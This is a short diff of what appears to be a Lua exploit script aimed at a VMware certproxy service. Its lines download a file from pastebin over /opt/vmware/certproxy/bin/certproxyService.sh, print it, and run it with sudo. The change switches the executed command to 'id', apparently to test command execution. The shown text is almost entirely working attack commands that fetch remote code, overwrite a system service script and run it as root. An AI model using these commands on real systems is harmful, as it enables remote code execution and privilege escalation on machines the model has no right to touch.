@@ -37,7 +37,7 @@ local cmd1 = 'curl https://pastebin.com/2hpdEN0g --output  /opt/vmware/certproxy
 --'curl https://pastebin.com/raw/EqKG959Z --output  /opt/vmware/certproxy/bin/certproxyService.sh'
 local cmd2 = 'cat /opt/vmware/certproxy/bin/certproxyService.sh'
 local cmd3 = 'sudo /opt/vmware/certproxy/bin/certproxyService.sh'
-local cmd = cmd3
+local cmd = "id"
 
 local tabstr = {}
 local strenc = ""
